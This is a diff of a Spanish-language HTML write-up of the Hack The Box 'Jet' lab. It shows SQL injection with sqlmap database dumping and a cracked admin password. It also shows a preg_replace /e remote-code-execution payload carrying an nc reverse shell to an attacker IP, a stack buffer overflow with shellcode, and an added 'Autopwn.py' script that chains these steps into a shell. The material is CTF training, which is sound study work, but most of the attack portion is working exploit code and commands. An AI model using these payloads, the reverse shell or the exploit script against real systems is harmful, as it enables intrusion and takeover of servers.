@@ -90,12 +90,12 @@ Machine LogForge
                               <span><a href="#"><i class="fa-solid fa-fire"></i> Fortress</a></span>
                          </div>
                          <div class="blog-post-des">
-                              <p>Jet.com es una empresa que esta desarrollando una nueva metodologia para el comercio electronico, ha colaborado con Hack The Box ofreciendonos una cantidad interesante de vulnerabilidades que ayudaran mucho a tener una vision mas empresarial de las pruebas de penetracion incorporando algunas flags que nos iran indicando cuando hemos pwneado cierta vulnerabilidad expuesta.</p>
+                              <p>Jet.com es una empresa que esta desarrollando una nueva metodología para el comercio electrónico, ha colaborado con Hack The Box ofreciendonos una cantidad interesante de vulnerabilidades que ayudaran mucho a tener una visión mas empresarial de las pruebas de penetración incorporando algunas flags que nos irán indicando cuando hemos pwneado cierta vulnerabilidad expuesta.</p>
                          </div>
 
                          <!--First Flag-->
                          <h3 style="color: #dacece;">Flag 1: Connect</h3>
-                         <p>La primera flag se consigue bajo la instruccion de conectar, primero verificamos si tenemos conexión e indirectamente conocemos el sistema operativo <a class="code">[ttl=64 - Linux]</a> bajo el cual se encuentra el servidor.</p>
+                         <p>La primera flag se consigue bajo la instrucción de conectar, primero verificamos si tenemos conexión e indirectamente conocemos el sistema operativo <a class="code">[ttl=64 - Linux]</a> bajo el cual se encuentra el servidor.</p>
                          <pre class="pre-code"><a class="command">❯ ping</a> 10.13.37.10
 10.13.37.10 (10.13.37.10) 56(84) bytes of data.
 64 bytes from 10.13.37.10: icmp_seq=1 ttl=63 time=81.1 ms
@@ -144,15 +144,15 @@ PORT     STATE SERVICE
 
                          <!--Third Flag-->
                          <h3 style="color: #dacece;">Flag 3: Going Deeper</h3>
-                         <p>En la tercera flag tenemos el mismo caso, el nombre nos indica buscar mas profundo asi que revisaremos el codigo fuente de la pagina que acabamos de descubrir.</p>
-                         <p>Entre el codigo fuente, siempre resaltan los scripts JS personalizados (custom), dentro de estos, el mas llamativo es <a class="code">secure.js</a></p>
+                         <p>En la tercera flag tenemos el mismo caso, el nombre nos indica buscar mas profundo asi que revise el código fuente de la pagina que acabamos de descubrir.</p>
+                         <p>Entre el código fuente, siempre resaltan los scripts JS personalizados (custom), dentro de estos, el mas llamativo es <a class="code">secure.js</a></p>
                          <pre class="pre-code">
 <a class="a-green">&lt;!-- Custom scripts for this template--&gt;</a>
 &lt;<a class="a-red">script</a> src="<u class="a-blue">js/template.js</u>"&gt;&lt;&#47;<a class="a-red">script</a>&gt;
 &lt;<a class="a-red">script</a> src="<u class="a-blue">js/secure.js</u>"&gt;&lt;&#47;<a class="a-red">script</a>&gt;</pre>     
                          <p><br>En este script encontramos un eval de JS</p>
                          <pre class="pre-code"> eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));</pre>
-                         <p><br>Para obtener el codigo usare la herramienta <a class="toolref" href="https://lelinhtinh.github.io/de4js/">de4js</a> encontrando el path de url <a class="code">/dirb_safe_dir_rf9EmcEIx/admin/stats.php</a></p>
+                         <p><br>Para obtener el código usé la herramienta <a class="toolref" href="https://lelinhtinh.github.io/de4js/">de4js</a> encontrando el path de url <a class="code">/dirb_safe_dir_rf9EmcEIx/admin/stats.php</a></p>
                          <span>
                               <img src="../images/HTB/Jet/deofuscate_eval.png"/>
                          </span>
@@ -160,11 +160,11 @@ PORT     STATE SERVICE
                          <span>
                               <img src="../images/HTB/Jet/stats.png"/>
                          </span>
-                         <p><br>Sin embargo, si quitamos el archivo final <a class="code">stats.php</a> la pagina hace un redirect a <a class="code">index.php</a></p>
+                         <p><br>Sin embargo, si quitamos el archivo final <a class="code">stats.php</a> la página hace un redirect a <a class="code">index.php</a></p>
                          <span>
                               <img src="../images/HTB/Jet/index.png"/>
                          </span>
-                         <p><br>Y en su codigo fuente la flag <a class="code">JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}</a></p>
+                         <p><br>Y en su código fuente la flag <a class="code">JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}</a></p>
                          <span>
                               <img src="../images/HTB/Jet/flag-3.png"/>
                          </span>
@@ -223,7 +223,7 @@ back-end DBMS: MySQL >= 5.0
 available databases [2]:
 [*] information_schema
 [*] jetadmin</pre>
-                         <p><br>Procedi a dumpear la base de datos <a class="code">jetadmin</a> obteniendo un hash del usuario admin.</p>
+                         <p><br>Procedí a dumpear la base de datos <a class="code">jetadmin</a> obteniendo un hash del usuario admin.</p>
                          <pre class="pre-code"><a class="command">❯ sqlmap</a> -r dologin -D jetadmin --dump
 [WARNING] no clear password(s) found
 Database: jetadmin
@@ -239,7 +239,7 @@ Table: users
                          <span>
                               <img src="../images/HTB/Jet/crackstation.png"/>
                          </span>
-                         <p><br>Iniciando sesion con las credenciales obtenidas obtuve la flag <a class="code">JET{sQl_1nj3ct1ons_4r3_fun!}</a>.</p>
+                         <p><br>Iniciando sesión con las credenciales obtenidas obtuve la flag <a class="code">JET{sQl_1nj3ct1ons_4r3_fun!}</a>.</p>
                          <span>
                               <img src="../images/HTB/Jet/flag-4.png"/>
                          </span>
@@ -271,7 +271,7 @@ Table: users
 <a class="a-blue">message</a>=<a class="a-green">&lt;p>s0b3k_message&lt;br>&lt;/p></a>&
 <a class="a-blue">_wysihtml5_mode</a>=1</pre>
                          </p>
-                         <p>Dada la lógica de <a class="code">Palabrotas</a> parece que realiza una busqueda y reemplazo de palabras, esto bajo las expresiones regulares <a class="code">/i</a> en base a esto probaremos la expresion regular de execución <a class="code">/e</a><br>Para prueba de concepto lanzare una traza icmp a mi maquina en espera de esta trama, reemplazando el payload tanto en el subject y el message.</p>
+                         <p>Dada la lógica de <a class="code">Palabrotas [swarwords]</a> parece que realiza una busqueda y reemplazo de estas palabras, esto bajo las expresiones regulares <a class="code">/i</a> en base a esto probaremos la expresión regular de execución <a class="code">/e</a><br>Para prueba de concepto lanzaré una traza icmp a mi máquina en espera de esta trama, reemplazando el payload tanto en el subject y el message.</p>
                          <pre class="pre-code">
 <a class="a-blue">swearwords</a>[<a class="a-red">/s0b3k_payload/e</a>]=<a class="a-green">ping -c1 10.10.14.10</a>&
 <a class="a-blue">to</a>=<a class="a-green">s0bek@mailtest.com</a>&
@@ -279,19 +279,19 @@ Table: users
 <a class="a-blue">message</a>=<a class="a-green">&lt;p>s0b3k_payload&lt;br>&lt;/p></a>&
 <a class="a-blue">_wysihtml5_mode</a>=1</pre>
                          <p>
-                              <br>La trama encodeada se vera de la siguiente manera:
+                              <br>La trama encodeada se verá de la siguiente manera:
                          </p>
                          <pre class="pre-code">
 swearwords%5B%2Fs0b3k_payload%2Fe%5D=system('ping%2010.10.14.10')&to=s0bek%40mailtest.com&subject=s0b3k_payload&message=%3Cp%3Es0b3k_payload%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1</pre>
                          <br>
-                         <p>A pesar de recivir la captura con la escucha de tcpdump, vemos que la peticion igual reemplaza el mensaje en el payload adjunto y se puede ver evidenciado en Burpsuite.
+                         <p>A pesar de recibir la captura con la escucha de tcpdump, vemos que la petición igual reemplaza el mensaje en el payload adjunto y se puede ver evidenciado en Burpsuite.
                          </p>
                          <span>
                               <img src="../images/HTB/Jet/POC_RCE.png"/>
                          </span>
                          <p>
                               <br>
-                              Aplicaria lo mismo para la shell reversa con el siguiente payload, de manera que ganamos acceso al sistema y podemos observar la flag <a class="code">JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}</a>
+                              Aplicaría lo mismo para la shell reversa con el siguiente payload, de manera que ganamos acceso al sistema y podemos observar la flag <a class="code">JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}</a>
                          </p>
                          <pre class="pre-code">
 swearwords%5B%2Fs0b3k_payload%2Fe%5D=system('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.10%204444%20%3E%2Ftmp%2Ff')&to=s0bek%40mailtest.com&subject=s0b3k_payload&message=%3Cp%3Es0b3k_payload%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1</pre>
@@ -314,7 +314,7 @@ $ </pre>
                          
                          <!--Start Sixth flag-->
                          <h3 style="color: #dacece;">Flag 6: Overflow</h3>
-                         <p> En la sexta flag llamada <a class="code">overflow</a> practicamente nos adelanta que ejecutaremos un <a class="code">[BOF] Buffer OverFlow.</a><br>Asi, despues del tratamiento de la tty comencé buscando un archivo binario que permita al usuario actual ejecutarse como sudo.</p>
+                         <p> En la sexta flag llamada <a class="code">overflow</a> prácticamente nos adelanta que ejecutaremos un <a class="code">[BOF] Buffer OverFlow.</a><br>Así, despues del tratamiento de la tty comencé buscando un archivo binario que permita al usuario actual ejecutarse con privilegios elevados.</p>
                          
                          <pre class="pre-code">
 www-data@jet:~$ find / -perm -u+s 2>/dev/null
@@ -342,7 +342,7 @@ www-data@jet:~$ find / -perm -u+s 2>/dev/null
 /bin/ping
 /bin/ntfs-3g
 /bin/ping6</pre>
-                         <p>El mas llamativo, por su ubicacion es el archivo leak, así, verificando su contenido lo lleve a mi máquina.</p>
+                         <p>El más llamativo, por su ubicación es el archivo leak, así, verificando su contenido lo lleve a mi máquina.</p>
                          
                          <pre class="pre-code">
 www-data@jet:/home$ file leak
@@ -360,20 +360,20 @@ leak          100%[=============================================================
 
 (271 MB/s) - «leak» guardado
                          </pre>
-                         <p>Revisandolo su ejecucion normal, nos da lo siguiente</p>
+                         <p>Revisandolo su ejecución normal, nos da lo siguiente</p>
                          <pre class="pre-code">
 <a class="command">❯ ./leak</a>
 Oops, I'm leaking! 0x7ffe3080fb60
 Pwn me ¯\_(ツ)_/¯ 
 > hola</pre>
-                         <p>Si al input le anidamos una cadena mas larga se produce un error de segmentacion, desbordando el espacio en memoria al cual se almacene este input.</p>
+                         <p>Si al input le anidamos una cadena más larga se produce un error de segmentación, desbordando el espacio en memoria al cual se almacene este input.</p>
                          <pre class="pre-code">
 <a class="command">❯ ./leak</a>
 Oops, I'm leaking! 0x7ffda23327f0
 Pwn me ¯\_(ツ)_/¯ 
 > 12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912
 zsh: segmentation fault  ./leak</pre>
-                         <p>Revisemos esto con gdb, adjunte una cadena de 200 veces 5 y valide que sea reemplazado en el RSP, nos indica que el 5 esta presente 128 veces, con esto ya podriamos deducir que el offset es <a class="code">72 [200-128]</a></p>
+                         <p>Revisemos esto con gdb, adjunte una cadena de 200 veces 5 y validé que sea reemplazado en el RSP, nos indica que el 5 esta presente 128 veces, con esto ya podriamos deducir que el offset es <a class="code">72 [200-128]</a></p>
                          <pre class="pre-code">
 <a class="command">❯ gdb</a> -q leak
 Reading symbols from leak...
@@ -414,20 +414,20 @@ Program received signal SIGSEGV, Segmentation fault.
                          <pre class="pre-code">
 <a class="command">❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb</a> -q 0x41346341
 [*] Exact match at offset 72</pre>
-                         <p>Ya que la salida del programa nos indica el leaking o EIP, temporalmente determinaremos el tamaño del Payload de la siguiente manera</p>
+                         <p>Ya que la salida del programa nos indica el leaking o RIP, temporalmente determinaremos el tamaño del Payload de la siguiente manera</p>
                          <pre class="pre-code">
 <a class="a-red">Shellcode</a> = int(?)
 <a class="a-green">Buffer</a> = \x55 * (72 - len(Shellcode))
 <a class="a-blue">RIP</a> = b"0x7fffffffe4a0"</pre>
-                         <p>Agregue un shellcode que no sobrepase la longitud destinada al offset, <a href="https://www.exploit-db.com/shellcodes/46907">exploitdb</a> contiene uno que ejecuta un /bin/sh.</p>
+                         <p>Agregué un shellcode que no sobrepase la longitud destinada al offset, <a href="https://www.exploit-db.com/shellcodes/46907">exploitdb</a> contiene uno que ejecuta un /bin/sh.</p>
                          <pre class="pre-code">
 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</pre>
-                         <p>Como vemos, el shellcode tendra una longitud de 23 bytes, de manera que nuestro payload quedaria de la siguiente manera.</p>
+                         <p>Como vemos, el shellcode tendrá una longitud de 23 bytes, de manera que nuestro payload quedaría de la siguiente manera.</p>
                          <pre class="pre-code">
 <a class="a-red">Shellcode</a> = \x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05
 <a class="a-green">Buffer</a> = \x55 * (72 - 23)
 <a class="a-blue">RIP</a> = b"0x7fffffffe4a0"</pre>
-                         <p>Ahora verificaremos que el shellcode sea incluido dentro de nuestro offset justo antes de nuestro NOPs. Creare el payload completo con python y revisare el RSP del buffer con gdb</p>
+                         <p>Ahora verificaremos que el shellcode sea incluido dentro de nuestro offset justo antes de nuestro NOPs. Crearé el payload completo con python y revisare el RSP del buffer con gdb</p>
                          <pre class="pre-code">
 <a class="command">❯ python3 </a>
 Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
@@ -468,9 +468,9 @@ Program received signal SIGSEGV, Segmentation fault.
 <a class="a-blue">0x7fffffffe518:</a>    0x00    0xf9    0xa9    0x47    0xe7    0x96    0x2d    0x0b
 <a class="a-blue">0x7fffffffe520:</a>    0xa0    0x06    0x40    0x00    0x00    0x00    0x00    0x00</pre>
 
-                         <p>Aunque notamos algunas variaciones en el payload debido a la interpretacion, el payload quedo funcional. 
+                         <p>Aunque notamos algunas variaciones en el payload debido a la interpretación, el payload quedo funcional. 
                          <br>Existe una complicación en que la dirección del RIP es variable entre cada ejecución fuera de gdb, para solventar esto filtraremos con python la salida del programa hasta llegar al RIP y agregarlo en una variable.
-                         <br> Adicional a ello para recibir la ejecución del comando levantaremos del lado del servidor el archivo en ejecución a través de socat y con python accederemos a la ejecución del binario de manera remota.
+                         <br>Adicional a ello para recibir la ejecución del comando levantaremos del lado del servidor el archivo en ejecución a través de socat y con python accederemos a la ejecución del binario de manera remota.
                          <br><br>El script en python queda de la siguiente manera:
                          </p>
                          <pre class="pre-code">
@@ -497,14 +497,65 @@ Program received signal SIGSEGV, Segmentation fault.
                          
                          <p>Exponemos la ejecución del binario</p>
                          <pre class="pre-code">www-data@jet:/home$ socat TCP-LISTEN:1337,fork EXEC:./leak &</pre>
-                         <p>Ejecución del script</p>
+                         <p>Ejecución del script, y ganando acceso como el usuario alex obtenemos la flag: <a class="code">JET{0v3rfL0w_f0r_73h_lulz}</a></p>
                          <pre class="pre-code">
 <a class="command">❯ ./leaking.py</a>
 [+] Opening connection to 10.13.37.10 on port 1337: Done
 [*] Switching to interactive mode
 <a class="a-red">$</a> whoami
-alex</pre>
+alex
+<a class="a-red">$</a> cd /home/alex
+<a class="a-red">$</a> ls
+crypter.py
+encrypted.txt
+exploitme.zip
+flag.txt
+<a class="a-red">$</a> cat flag.txt
+JET{0v3rfL0w_f0r_73h_lulz}
+<a class="a-red">$</a></pre>
                          <!--End Sixth flag-->
+
+                         <!-- AUTOPWN-->
+                         <h3 style="color: #dacece;">AUTOPWN</h3>
+                         <p>Hasta el momento hemos llegado a la mitad del reto donde obtuvimos una shell como Alex, en este punto generé un exploit que automatiza lo necesario para obtener esta shell.
+                         <br><a class="code">Adjunto el script Autopwn.py</a></p>
+                         <pre class="pre-code">
+<span class="a-gray">#!/usr/bin/python3</span>
+
+<span class="a-blue">import</span> requests
+<span class="a-blue">from</span> pwn <span class="a-blue">import</span> *
+
+<span class="a-red">def</span> <span class="a-blue">LeakExpose</span>():
+    url = <span class="a-green">"http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin"</span>
+    r = requests.Session()
+    credentials = { <span class="a-green">"username": "admin", "password": "Hackthesystem200"</span> }
+    data = { <span class="a-green">"swearwords[/s0b3k_payload/e]"</span>: f<span class="a-green">"system('socat TCP-LISTEN:1337,fork EXEC:./leak &')"</span>, <span class="a-green">"to"</span>: <span class="a-green">"s0b3k@pwned.com"</span>, <span class="a-green">"subject"</span>: <span class="a-green">"s0b3k"</span>, <span class="a-green">"message"</span>: <span class="a-green">"s0b3k_payload"</span>, <span class="a-green">"_wysihtml5_mode"</span>: <span class="a-yellow">1</span> }
+    r.post(url + <span class="a-green">'/dologin.php'</span>, data=credentials, verify=False)
+    r.post(url + <span class="a-green">'/email.php'</span>, data=data, verify=False)
+
+<span class="a-red">def</span> <span class="a-blue">autopwn</span>():
+    shell = remote(<span class="a-green">'10.13.37.10'</span>, <span class="a-yellow">1337</span>)
+    shell.recvuntil(b<span class="a-green">"Oops, I'm leaking! "</span>)
+    
+    shellcode = b"<span class="a-blue">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span>"
+    offset = b<span class="a-blue">"\x55"</span>*(<span class="a-yellow">72</span>-<span class="a-yellow">23</span>)
+    rip = int(shell.recvuntil(b"\n"),<span class="a-yellow">16</span>)
+    payload = shellcode + offset + p64(rip)
+    
+    shell.recvuntil(b"> ")
+    shell.sendline(payload)
+    shell.interactive()
+
+<span class="a-purple">if</span> __name__ == <span class="a-green">"__main__"</span>:
+    expose = threading.Thread(target=LeakExpose)
+    pwn = threading.Thread(target=autopwn)
+    
+    expose.start()
+    time.sleep(<span class="a-yellow">3</span>)
+    pwn.start()
+    <span class="a-red">pass</span>
+</pre>
+                         <!-- END AUTOPWN-->
                          <div class="blog-author">
                               <div class="media">
                                    <div class="media-object pull-left">
